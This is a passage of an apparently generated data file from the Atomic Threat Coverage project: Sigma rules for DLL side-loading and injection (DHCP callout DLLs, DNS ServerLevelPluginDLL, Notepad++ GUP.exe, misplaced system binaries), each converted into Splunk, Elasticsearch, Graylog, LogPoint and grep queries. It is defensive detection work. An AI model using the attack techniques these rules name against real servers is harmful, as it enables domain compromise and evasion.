Image=\"*\\\\\\\\SysWowo64\\\\\\\\*\")))) OR (Image=\"*\\\\\\\\Mc.exe\" NOT ((Image=\"*\\\\\\\\Microsoft Visual Studio*\" OR Image=\"*\\\\\\\\Microsoft SDK*\" OR Image=\"*\\\\\\\\Windows Kit*\")))) OR (Image=\"*\\\\\\\\MsMpEng.exe\" NOT ((Image=\"*\\\\\\\\Microsoft Security Client\\\\\\\\*\" OR Image=\"*\\\\\\\\Windows Defender\\\\\\\\*\" OR Image=\"*\\\\\\\\AntiMalware\\\\\\\\*\")))) OR (Image=\"*\\\\\\\\msseces.exe\" NOT ((Image=\"*\\\\\\\\Microsoft Security Center\\\\\\\\*\" OR Image=\"*\\\\\\\\Microsoft Security Client\\\\\\\\*\" OR Image=\"*\\\\\\\\Microsoft Security Essentials\\\\\\\\*\")))) OR (Image=\"*\\\\\\\\OInfoP11.exe\" NOT (Image=\"*\\\\\\\\Common Files\\\\\\\\Microsoft Shared\\\\\\\\*\"))) OR (Image=\"*\\\\\\\\OleView.exe\" NOT ((Image=\"*\\\\\\\\Microsoft Visual Studio*\" OR Image=\"*\\\\\\\\Microsoft SDK*\" OR Image=\"*\\\\\\\\Windows Kit*\" OR Image=\"*\\\\\\\\Windows Resource Kit\\\\\\\\*\")))) OR (Image=\"*\\\\\\\\rc.exe\" NOT ((Image=\"*\\\\\\\\Microsoft Visual Studio*\" OR Image=\"*\\\\\\\\Microsoft SDK*\" OR Image=\"*\\\\\\\\Windows Kit*\" OR Image=\"*\\\\\\\\Windows Resource Kit\\\\\\\\*\" OR Image=\"*\\\\\\\\Microsoft.NET\\\\\\\\*\")))) | table CommandLine,ParentCommandLine", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" ((((((((((((Image=\"*\\\\\\\\CamMute.exe\"  -(Image=\"*\\\\\\\\Lenovo\\\\\\\\Communication Utility\\\\\\\\*\")) OR (Image=\"*\\\\\\\\chrome_frame_helper.exe\"  -(Image=\"*\\\\\\\\Google\\\\\\\\Chrome\\\\\\\\application\\\\\\\\*\"))) OR (Image=\"*\\\\\\\\dvcemumanager.exe\"  -(Image=\"*\\\\\\\\Microsoft Device Emulator\\\\\\\\*\"))) OR (Image=\"*\\\\\\\\Gadget.exe\"  -(Image=\"*\\\\\\\\Windows Media Player\\\\\\\\*\"))) OR (Image=\"*\\\\\\\\hcc.exe\"  -(Image=\"*\\\\\\\\HTML Help Workshop\\\\\\\\*\"))) OR (Image=\"*\\\\\\\\hkcmd.exe\"  -(Image IN [\"*\\\\\\\\System32\\\\\\\\*\", \"*\\\\\\\\SysNative\\\\\\\\*\", \"*\\\\\\\\SysWowo64\\\\\\\\*\"]))) OR (Image=\"*\\\\\\\\Mc.exe\"  -(Image IN [\"*\\\\\\\\Microsoft Visual Studio*\", \"*\\\\\\\\Microsoft SDK*\", \"*\\\\\\\\Windows Kit*\"]))) OR (Image=\"*\\\\\\\\MsMpEng.exe\"  -(Image IN [\"*\\\\\\\\Microsoft Security Client\\\\\\\\*\", \"*\\\\\\\\Windows Defender\\\\\\\\*\", \"*\\\\\\\\AntiMalware\\\\\\\\*\"]))) OR (Image=\"*\\\\\\\\msseces.exe\"  -(Image IN [\"*\\\\\\\\Microsoft Security Center\\\\\\\\*\", \"*\\\\\\\\Microsoft Security Client\\\\\\\\*\", \"*\\\\\\\\Microsoft Security Essentials\\\\\\\\*\"]))) OR (Image=\"*\\\\\\\\OInfoP11.exe\"  -(Image=\"*\\\\\\\\Common Files\\\\\\\\Microsoft Shared\\\\\\\\*\"))) OR (Image=\"*\\\\\\\\OleView.exe\"  -(Image IN [\"*\\\\\\\\Microsoft Visual Studio*\", \"*\\\\\\\\Microsoft SDK*\", \"*\\\\\\\\Windows Kit*\", \"*\\\\\\\\Windows Resource Kit\\\\\\\\*\"]))) OR (Image=\"*\\\\\\\\rc.exe\"  -(Image IN [\"*\\\\\\\\Microsoft Visual Studio*\", \"*\\\\\\\\Microsoft SDK*\", \"*\\\\\\\\Windows Kit*\", \"*\\\\\\\\Windows Resource Kit\\\\\\\\*\", \"*\\\\\\\\Microsoft.NET\\\\\\\\*\"]))))", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?:.*(?:.*(?:.*(?:.*(?:.*(?:.*(?:.*(?:.*(?:.*(?:.*(?:.*(?:.*(?:.*(?:.*(?:.*(?:.*(?:.*(?:.*(?:.*(?:.*(?:.*(?:.*(?=.*.*\\\\CamMute\\\\.exe)(?=.*(?!.*(?:.*(?=.*.*\\\\Lenovo\\\\Communication Utility\\\\\\\\.*)))))|.*(?:.*(?=.*.*\\\\chrome_frame_helper\\\\.exe)(?=.*(?!.*(?:.*(?=.*.*\\\\Google\\\\Chrome\\\\application\\\\\\\\.*)))))))|.*(?:.*(?=.*.*\\\\dvcemumanager\\\\.exe)(?=.*(?!.*(?:.*(?=.*.*\\\\Microsoft Device Emulator\\\\\\\\.*)))))))|.*(?:.*(?=.*.*\\\\Gadget\\\\.exe)(?=.*(?!.*(?:.*(?=.*.*\\\\Windows Media Player\\\\\\\\.*)))))))|.*(?:.*(?=.*.*\\\\hcc\\\\.exe)(?=.*(?!.*(?:.*(?=.*.*\\\\HTML Help Workshop\\\\\\\\.*)))))))|.*(?:.*(?=.*.*\\\\hkcmd\\\\.exe)(?=.*(?!.*(?:.*(?=.*(?:.*.*\\\\System32\\\\\\\\.*|.*.*\\\\SysNative\\\\\\\\.*|.*.*\\\\SysWowo64\\\\\\\\.*))))))))|.*(?:.*(?=.*.*\\\\Mc\\\\.exe)(?=.*(?!.*(?:.*(?=.*(?:.*.*\\\\Microsoft Visual Studio.*|.*.*\\\\Microsoft SDK.*|.*.*\\\\Windows Kit.*))))))))|.*(?:.*(?=.*.*\\\\MsMpEng\\\\.exe)(?=.*(?!.*(?:.*(?=.*(?:.*.*\\\\Microsoft Security Client\\\\\\\\.*|.*.*\\\\Windows Defender\\\\\\\\.*|.*.*\\\\AntiMalware\\\\\\\\.*))))))))|.*(?:.*(?=.*.*\\\\msseces\\\\.exe)(?=.*(?!.*(?:.*(?=.*(?:.*.*\\\\Microsoft Security Center\\\\\\\\.*|.*.*\\\\Microsoft Security Client\\\\\\\\.*|.*.*\\\\Microsoft Security Essentials\\\\\\\\.*))))))))|.*(?:.*(?=.*.*\\\\OInfoP11\\\\.exe)(?=.*(?!.*(?:.*(?=.*.*\\\\Common Files\\\\Microsoft Shared\\\\\\\\.*)))))))|.*(?:.*(?=.*.*\\\\OleView\\\\.exe)(?=.*(?!.*(?:.*(?=.*(?:.*.*\\\\Microsoft Visual Studio.*|.*.*\\\\Microsoft SDK.*|.*.*\\\\Windows Kit.*|.*.*\\\\Windows Resource Kit\\\\\\\\.*))))))))|.*(?:.*(?=.*.*\\\\rc\\\\.exe)(?=.*(?!.*(?:.*(?=.*(?:.*.*\\\\Microsoft Visual Studio.*|.*.*\\\\Microsoft SDK.*|.*.*\\\\Windows Kit.*|.*.*\\\\Windows Resource Kit\\\\\\\\.*|.*.*\\\\Microsoft\\\\.NET\\\\\\\\.*))))))))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: DHCP Server Loaded the CallOut DLL\nid: 13fc89a9-971e-4ca6-b9dc-aa53a445bf40\nstatus: experimental\ndescription: This rule detects a DHCP server in which a specified Callout DLL (in registry) was loaded\nreferences:\n    - https://blog.3or.de/mimilib-dhcp-server-callout-dll-injection.html\n    - https://technet.microsoft.com/en-us/library/cc726884(v=ws.10).aspx\n    - https://msdn.microsoft.com/de-de/library/windows/desktop/aa363389(v=vs.85).aspx\ndate: 2017/05/15\nauthor: Dimitrios Slamaris\ntags:\n    - attack.defense_evasion\n    - attack.t1073\nlogsource:\n    product: windows\n    service: system\ndetection:\n    selection:\n        EventID: 1033\n    condition: selection\nfalsepositives: \n    - Unknown\nlevel: critical", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: DHCP Server Loaded the CallOut DLL\nid: 13fc89a9-971e-4ca6-b9dc-aa53a445bf40\nstatus: experimental\ndescription: This rule detects a DHCP server in which a specified Callout DLL (in registry) was loaded\nreferences:\n    - https://blog.3or.de/mimilib-dhcp-server-callout-dll-injection.html\n    - https://technet.microsoft.com/en-us/library/cc726884(v=ws.10).aspx\n    - https://msdn.microsoft.com/de-de/library/windows/desktop/aa363389(v=vs.85).aspx\ndate: 2017/05/15\nauthor: Dimitrios Slamaris\ntags:\n    - attack.defense_evasion\n    - attack.t1073\nlogsource:\n    product: windows\n    service: system\ndetection:\n    selection:\n        EventID: 1033\n    condition: selection\nfalsepositives: \n    - Unknown\nlevel: critical", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "EventID:\"1033\"", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/DHCP-Server-Loaded-the-CallOut-DLL <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"DHCP Server Loaded the CallOut DLL\",\\n    \"description\": \"This rule detects a DHCP server in which a specified Callout DLL (in registry) was loaded\",\\n    \"tags\": [\\n      \"attack.defense_evasion\",\\n      \"attack.t1073\"\\n    ],\\n    \"query\": \"EventID:\\\\\"1033\\\\\"\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"EventID:\\\\\"1033\\\\\"\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'DHCP Server Loaded the CallOut DLL\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "EventID:\"1033\"", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "EventID=\"1033\"", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_source=\"Microsoft-Windows-Security-Auditing\" event_id=\"1033\")", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^1033'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: DHCP Server Error Failed Loading the CallOut DLL\nid: 75edd3fd-7146-48e5-9848-3013d7f0282c\ndescription: This rule detects a DHCP server error in which a specified Callout DLL (in registry) could not be loaded\nstatus: experimental\nreferences:\n    - https://blog.3or.de/mimilib-dhcp-server-callout-dll-injection.html\n    - https://technet.microsoft.com/en-us/library/cc726884(v=ws.10).aspx\n    - https://msdn.microsoft.com/de-de/library/windows/desktop/aa363389(v=vs.85).aspx\ndate: 2017/05/15\nmodified: 2019/07/17\ntags:\n    - attack.defense_evasion\n    - attack.t1073\nauthor: \"Dimitrios Slamaris, @atc_project (fix)\"\nlogsource:\n    product: windows\n    service: system\ndetection:\n    selection:\n        EventID: \n            - 1031\n            - 1032\n            - 1034\n        Source: Microsoft-Windows-DHCP-Server            \n    condition: selection\nfalsepositives: \n    - Unknown\nlevel: critical", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: DHCP Server Error Failed Loading the CallOut DLL\nid: 75edd3fd-7146-48e5-9848-3013d7f0282c\ndescription: This rule detects a DHCP server error in which a specified Callout DLL (in registry) could not be loaded\nstatus: experimental\nreferences:\n    - https://blog.3or.de/mimilib-dhcp-server-callout-dll-injection.html\n    - https://technet.microsoft.com/en-us/library/cc726884(v=ws.10).aspx\n    - https://msdn.microsoft.com/de-de/library/windows/desktop/aa363389(v=vs.85).aspx\ndate: 2017/05/15\nmodified: 2019/07/17\ntags:\n    - attack.defense_evasion\n    - attack.t1073\nauthor: \"Dimitrios Slamaris, @atc_project (fix)\"\nlogsource:\n    product: windows\n    service: system\ndetection:\n    selection:\n        EventID: \n            - 1031\n            - 1032\n            - 1034\n        Source: Microsoft-Windows-DHCP-Server            \n    condition: selection\nfalsepositives: \n    - Unknown\nlevel: critical", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(EventID:(\"1031\" OR \"1032\" OR \"1034\") AND Source:\"Microsoft\\\\-Windows\\\\-DHCP\\\\-Server\")", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/DHCP-Server-Error-Failed-Loading-the-CallOut-DLL <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"DHCP Server Error Failed Loading the CallOut DLL\",\\n    \"description\": \"This rule detects a DHCP server error in which a specified Callout DLL (in registry) could not be loaded\",\\n    \"tags\": [\\n      \"attack.defense_evasion\",\\n      \"attack.t1073\"\\n    ],\\n    \"query\": \"(EventID:(\\\\\"1031\\\\\" OR \\\\\"1032\\\\\" OR \\\\\"1034\\\\\") AND Source:\\\\\"Microsoft\\\\\\\\-Windows\\\\\\\\-DHCP\\\\\\\\-Server\\\\\")\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(EventID:(\\\\\"1031\\\\\" OR \\\\\"1032\\\\\" OR \\\\\"1034\\\\\") AND Source:\\\\\"Microsoft\\\\\\\\-Windows\\\\\\\\-DHCP\\\\\\\\-Server\\\\\")\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'DHCP Server Error Failed Loading the CallOut DLL\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(EventID:(\"1031\" \"1032\" \"1034\") AND Source:\"Microsoft\\\\-Windows\\\\-DHCP\\\\-Server\")", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "((EventID=\"1031\" OR EventID=\"1032\" OR EventID=\"1034\") Source=\"Microsoft-Windows-DHCP-Server\")", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_source=\"Microsoft-Windows-Security-Auditing\" event_id IN [\"1031\", \"1032\", \"1034\"] Source=\"Microsoft-Windows-DHCP-Server\")", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*(?:.*1031|.*1032|.*1034))(?=.*Microsoft-Windows-DHCP-Server))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: DNS Server Error Failed Loading the ServerLevelPluginDLL\nid: cbe51394-cd93-4473-b555-edf0144952d9\ndescription: This rule detects a DNS server error in which a specified plugin DLL (in registry) could not be loaded\nstatus: experimental\ndate: 2017/05/08\nreferences:\n    - https://medium.com/@esnesenon/feature-not-bug-dnsadmin-to-dc-compromise-in-one-line-a0f779b8dc83\n    - https://technet.microsoft.com/en-us/library/cc735829(v=ws.10).aspx\n    - https://twitter.com/gentilkiwi/status/861641945944391680\ntags:\n    - attack.defense_evasion\n    - attack.t1073\nauthor: Florian Roth\nlogsource:\n    product: windows\n    service: dns-server\ndetection:\n    selection:\n        EventID: \n            - 150\n            - 770\n    condition: selection\nfalsepositives: \n    - Unknown\nlevel: critical", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: DNS Server Error Failed Loading the ServerLevelPluginDLL\nid: cbe51394-cd93-4473-b555-edf0144952d9\ndescription: This rule detects a DNS server error in which a specified plugin DLL (in registry) could not be loaded\nstatus: experimental\ndate: 2017/05/08\nreferences:\n    - https://medium.com/@esnesenon/feature-not-bug-dnsadmin-to-dc-compromise-in-one-line-a0f779b8dc83\n    - https://technet.microsoft.com/en-us/library/cc735829(v=ws.10).aspx\n    - https://twitter.com/gentilkiwi/status/861641945944391680\ntags:\n    - attack.defense_evasion\n    - attack.t1073\nauthor: Florian Roth\nlogsource:\n    product: windows\n    service: dns-server\ndetection:\n    selection:\n        EventID: \n            - 150\n            - 770\n    condition: selection\nfalsepositives: \n    - Unknown\nlevel: critical", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "EventID:(\"150\" OR \"770\")", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/DNS-Server-Error-Failed-Loading-the-ServerLevelPluginDLL <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"DNS Server Error Failed Loading the ServerLevelPluginDLL\",\\n    \"description\": \"This rule detects a DNS server error in which a specified plugin DLL (in registry) could not be loaded\",\\n    \"tags\": [\\n      \"attack.defense_evasion\",\\n      \"attack.t1073\"\\n    ],\\n    \"query\": \"EventID:(\\\\\"150\\\\\" OR \\\\\"770\\\\\")\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"EventID:(\\\\\"150\\\\\" OR \\\\\"770\\\\\")\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'DNS Server Error Failed Loading the ServerLevelPluginDLL\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "EventID:(\"150\" \"770\")", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(EventID=\"150\" OR EventID=\"770\")", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_source=\"DNS Server\" event_id IN [\"150\", \"770\"])", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*150|.*770)'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Suspicious GUP Usage\nid: 0a4f6091-223b-41f6-8743-f322ec84930b\ndescription: Detects execution of the Notepad++ updater in a suspicious directory, which is often used in DLL side-loading attacks\nstatus: experimental\nreferences:\n    - https://www.fireeye.com/blog/threat-research/2018/09/apt10-targeting-japanese-corporations-using-updated-ttps.html\ntags:\n    - attack.defense_evasion\n    - attack.t1073\nauthor: Florian Roth\ndate: 2019/02/06\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image: '*\\GUP.exe'\n    filter:\n        Image:\n            - 'C:\\Users\\\\*\\AppData\\Local\\Notepad++\\updater\\gup.exe'\n            - 'C:\\Users\\\\*\\AppData\\Roaming\\Notepad++\\updater\\gup.exe'\n            - 'C:\\Program Files\\Notepad++\\updater\\gup.exe'\n            - 'C:\\Program Files (x86)\\Notepad++\\updater\\gup.exe'\n    condition: selection and not filter\nfalsepositives:\n    - Execution of tools named GUP.exe and located in folders different than Notepad++\\updater\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Suspicious GUP Usage\nid: 0a4f6091-223b-41f6-8743-f322ec84930b\ndescription: Detects execution of the Notepad++ updater in a suspicious directory, which is often used in DLL side-loading attacks\nstatus: experimental\nreferences:\n    - https://www.fireeye.com/blog/threat-research/2018/09/apt10-targeting-japanese-corporations-using-updated-ttps.html\ntags:\n    - attack.defense_evasion\n    - attack.t1073\nauthor: Florian Roth\ndate: 2019/02/06\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image: '*\\GUP.exe'\n    filter:\n        Image:\n            - 'C:\\Users\\\\*\\AppData\\Local\\Notepad++\\updater\\gup.exe'\n            - 'C:\\Users\\\\*\\AppData\\Roaming\\Notepad++\\updater\\gup.exe'\n            - 'C:\\Program Files\\Notepad++\\updater\\gup.exe'\n            - 'C:\\Program Files (x86)\\Notepad++\\updater\\gup.exe'\n    condition: selection and not filter\nfalsepositives:\n    - Execution of tools named GUP.exe and located in folders different than Notepad++\\updater\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(Image.keyword:*\\\\\\\\GUP.exe AND (NOT (Image.keyword:(C\\\\:\\\\\\\\Users\\\\\\\\*\\\\\\\\AppData\\\\\\\\Local\\\\\\\\Notepad\\\\+\\\\+\\\\\\\\updater\\\\\\\\gup.exe OR C\\\\:\\\\\\\\Users\\\\\\\\*\\\\\\\\AppData\\\\\\\\Roaming\\\\\\\\Notepad\\\\+\\\\+\\\\\\\\updater\\\\\\\\gup.exe OR C\\\\:\\\\\\\\Program\\\\ Files\\\\\\\\Notepad\\\\+\\\\+\\\\\\\\updater\\\\\\\\gup.exe OR C\\\\:\\\\\\\\Program\\\\ Files\\\\ \\\\(x86\\\\)\\\\\\\\Notepad\\\\+\\\\+\\\\\\\\updater\\\\\\\\gup.exe))))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Suspicious-GUP-Usage <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Suspicious GUP Usage\",\\n    \"description\": \"Detects execution of the Notepad++ updater in a suspicious directory, which is often used in DLL side-loading attacks\",\\n    \"tags\": [\\n      \"attack.defense_evasion\",\\n      \"attack.t1073\"\\n    ],\\n    \"query\": \"(Image.keyword:*\\\\\\\\\\\\\\\\GUP.exe AND (NOT (Image.keyword:(C\\\\\\\\:\\\\\\\\\\\\\\\\Users\\\\\\\\\\\\\\\\*\\\\\\\\\\\\\\\\AppData\\\\\\\\\\\\\\\\Local\\\\\\\\\\\\\\\\Notepad\\\\\\\\+\\\\\\\\+\\\\\\\\\\\\\\\\updater\\\\\\\\\\\\\\\\gup.exe OR C\\\\\\\\:\\\\\\\\\\\\\\\\Users\\\\\\\\\\\\\\\\*\\\\\\\\\\\\\\\\AppData\\\\\\\\\\\\\\\\Roaming\\\\\\\\\\\\\\\\Notepad\\\\\\\\+\\\\\\\\+\\\\\\\\\\\\\\\\updater\\\\\\\\\\\\\\\\gup.exe OR C\\\\\\\\:\\\\\\\\\\\\\\\\Program\\\\\\\\ Files\\\\\\\\\\\\\\\\Notepad\\\\\\\\+\\\\\\\\+\\\\\\\\\\\\\\\\updater\\\\\\\\\\\\\\\\gup.exe OR C\\\\\\\\:\\\\\\\\\\\\\\\\Program\\\\\\\\ Files\\\\\\\\ \\\\\\\\(x86\\\\\\\\)\\\\\\\\\\\\\\\\Notepad\\\\\\\\+\\\\\\\\+\\\\\\\\\\\\\\\\updater\\\\\\\\\\\\\\\\gup.exe))))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(Image.keyword:*\\\\\\\\\\\\\\\\GUP.exe AND (NOT (Image.keyword:(C\\\\\\\\:\\\\\\\\\\\\\\\\Users\\\\\\\\\\\\\\\\*\\\\\\\\\\\\\\\\AppData\\\\\\\\\\\\\\\\Local\\\\\\\\\\\\\\\\Notepad\\\\\\\\+\\\\\\\\+\\\\\\\\\\\\\\\\updater\\\\\\\\\\\\\\\\gup.exe OR C\\\\\\\\:\\\\\\\\\\\\\\\\Users\\\\\\\\\\\\\\\\*\\\\\\\\\\\\\\\\AppData\\\\\\\\\\\\\\\\Roaming\\\\\\\\\\\\\\\\Notepad\\\\\\\\+\\\\\\\\+\\\\\\\\\\\\\\\\updater\\\\\\\\\\\\\\\\gup.exe OR C\\\\\\\\:\\\\\\\\\\\\\\\\Program\\\\\\\\ Files\\\\\\\\\\\\\\\\Notepad\\\\\\\\+\\\\\\\\+\\\\\\\\\\\\\\\\updater\\\\\\\\\\\\\\\\gup.exe OR C\\\\\\\\:\\\\\\\\\\\\\\\\Program\\\\\\\\ Files\\\\\\\\ \\\\\\\\(x86\\\\\\\\)\\\\\\\\\\\\\\\\Notepad\\\\\\\\+\\\\\\\\+\\\\\\\\\\\\\\\\updater\\\\\\\\\\\\\\\\gup.exe))))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Suspicious GUP Usage\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(Image.keyword:*\\\\\\\\GUP.exe AND (NOT (Image.keyword:(C\\\\:\\\\\\\\Users\\\\\\\\*\\\\\\\\AppData\\\\\\\\Local\\\\\\\\Notepad\\\\+\\\\+\\\\\\\\updater\\\\\\\\gup.exe C\\\\:\\\\\\\\Users\\\\\\\\*\\\\\\\\AppData\\\\\\\\Roaming\\\\\\\\Notepad\\\\+\\\\+\\\\\\\\updater\\\\\\\\gup.exe C\\\\:\\\\\\\\Program Files\\\\\\\\Notepad\\\\+\\\\+\\\\\\\\updater\\\\\\\\gup.exe C\\\\:\\\\\\\\Program Files \\\\(x86\\\\)\\\\\\\\Notepad\\\\+\\\\+\\\\\\\\updater\\\\\\\\gup.exe))))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(Image=\"*\\\\\\\\GUP.exe\" NOT ((Image=\"C:\\\\\\\\Users\\\\\\\\*\\\\\\\\AppData\\\\\\\\Local\\\\\\\\Notepad++\\\\\\\\updater\\\\\\\\gup.exe\" OR Image=\"C:\\\\\\\\Users\\\\\\\\*\\\\\\\\AppData\\\\\\\\Roaming\\\\\\\\Notepad++\\\\\\\\updater\\\\\\\\gup.exe\" OR Image=\"C:\\\\\\\\Program Files\\\\\\\\Notepad++\\\\\\\\updater\\\\\\\\gup.exe\" OR Image=\"C:\\\\\\\\Program Files (x86)\\\\\\\\Notepad++\\\\\\\\updater\\\\\\\\gup.exe\")))", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" Image=\"*\\\\\\\\GUP.exe\"  -(Image IN [\"C:\\\\\\\\Users\\\\\\\\*\\\\\\\\AppData\\\\\\\\Local\\\\\\\\Notepad++\\\\\\\\updater\\\\\\\\gup.exe\", \"C:\\\\\\\\Users\\\\\\\\*\\\\\\\\AppData\\\\\\\\Roaming\\\\\\\\Notepad++\\\\\\\\updater\\\\\\\\gup.exe\", \"C:\\\\\\\\Program Files\\\\\\\\Notepad++\\\\\\\\updater\\\\\\\\gup.exe\", \"C:\\\\\\\\Program Files (x86)\\\\\\\\Notepad++\\\\\\\\updater\\\\\\\\gup.exe\"]))", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P 